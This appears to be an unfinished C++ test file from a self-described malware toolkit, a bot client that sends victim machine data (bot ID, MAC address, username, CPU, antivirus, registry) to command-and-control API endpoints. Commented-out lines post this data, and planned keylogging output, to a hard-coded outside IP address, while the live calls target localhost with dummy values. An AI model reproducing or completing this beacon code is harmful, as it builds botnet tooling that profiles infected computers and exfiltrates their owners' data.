#include <iostream>
#include <stdio.h>
#include <string>
#include <vector>
#include "HttpLib.h"
#include "UtilLib.h"

#define size(a) sizeof(a)/sizeof(a[0])

using namespace std;

int main(int argc, char *argv[])
{
	string url = "localhost";
	string api = "/malware_toolkit/api/test/";
	vector<string> keys= { "bot_id", "mac_address", "username" , "cpu", "antivirus", "registry"};
	vector<string> values = { "1234567890234560", "33-33-33-33-33-33", "mark" , "lol", "antivirus", "registry"};
	vector<vector<string>> requestQueue;
	char* query = NULL;
	//FINISH ME FUCKING LATER
	char* response = NULL;
	vector<string> params;

	// a char[] where we will get our query string
	//char* query = NULL;
	//convertArgsToStr(keys, values, size(keys), &query);
	//cout << query << endl;

		//char* getRes = httpGetRequest(url, api, 50000, query);
		//cout << getRes << endl;
		//delete[] getRes;

		//char* postRes = httpPostRequest(url, api, 50000, query);
		//cout << postRes << endl;
		//delete[] postRes;

		//char* query = NULL;
		//convertArgsToPost(keys, values, size(keys), &query);
		//cout << query << endl;

	//get for connec_in [mac_address, bot_id, os]
	//params = { "mac_address", "bot_id", "os" };
	//getArgsToString(keys, values, getSize(keys), params, getSize(params), "POST", &query);
	//if (strcmp(query, "err")){
	//	char* postRes = httpPostRequest("70.61.16.8", "/database/api/connect_in/", 50000, query);
	//	if (strcmp(postRes, "") == 0){
	//		queueRequest("/database/api/")
	//	}
	//	//handle response
	//	delete[] postRes;
	//}

	response = sendG_Request(requestQueue, keys, values, { "mac_address", "bot_id", "os" }, "/database/api/add_os/");
	cout << response << endl;
	return 0;

	//Post for add_os [mac_address, bot_id, os]
	//params = { "mac_address", "bot_id", "os" };
	sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "os" }, "/database/api/add_os/");

	//Post for add_cpu [mac_address, bot_id, cpu]
	//params = { "mac_address", "bot_id", "cpu" };
	sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "cpu" }, "/database/api/add_cpu/");

	//Post for add_antivirus [mac_address, bot_id, antivirus]
	//params = { "mac_address", "bot_id", "antivirus" };
	sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "antivirus" }, "/database/api/add_antivirus/");

	//Post for add_registry [mac_address, bot_id, registry]
	//params = { "mac_address", "bot_id", "registry" };
	sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "registry" }, "/database/api/add_registry/");

	//Post for add_antivirus [mac_address, bot_id, antivirus]
	//params = { "mac_address", "bot_id", "antivirus" };
	sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "antivirus" }, "/database/api/add_antivirus/");

	//Post for add_username [mac_address, bot_id, username]
	//params = { "mac_address", "bot_id", "username" };
	sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "username" }, "/database/api/add_username/");

	return 0;

	//this one needs work
	//Post for add_keylogging [mac_address, bot_id, keylogging]
	//char* postRes = httpPostRequest("70.61.16.8", "/database/api/add_keylogging/", 50000, query);
	//cout << postRes << endl;
	//delete[] postRes;

	//delete[] query;

	//system("pause");
	return 0;
}
